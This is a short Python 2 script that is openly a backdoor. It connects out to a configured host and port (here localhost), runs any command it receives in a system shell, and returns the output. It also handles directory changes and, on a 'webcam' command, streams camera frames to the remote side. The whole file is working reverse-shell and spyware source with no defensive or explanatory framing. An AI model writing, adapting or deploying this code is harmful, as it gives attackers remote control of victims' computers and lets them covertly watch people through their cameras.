import socket
import thread
import cv2, numpy
import subprocess
import os

def webcam(sock):
    capture = cv2.VideoCapture(0)

    while True:
        ret, frame = capture.read()
        result, imgencode = cv2.imencode('.jpg', frame, [1,90])
        data = numpy.array(imgencode)
        stringData = data.tostring()

        try:
            sock.sendall(stringData)

            sock.close()

        except:
            pass

    capture.release()


def backdoor():
    while True:
        try:
            s = socket.socket()
            s.connect((host, port))
            while True:
                data = s.recv(1024)

                if data == "quit": break

                elif data.startswith("cd"): 
                    try:
                        os.chdir(data[3:])
                        stdoutput = ""
                    except:
                        stdoutput = "The system cannot find the path specified"

                elif data == "webcam":
                    thread.start_new_thread(webcam , (s,))
                    stdoutput = ""

                else:
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdoutput = proc.stdout.read() + proc.stderr.read()
                    
                stdoutput = stdoutput + "\n" + os.getcwd() + ">"
                s.send(stdoutput)

            s.close()
        except:
            pass
        
host = "localhost"
port = 6676

backdoor()        
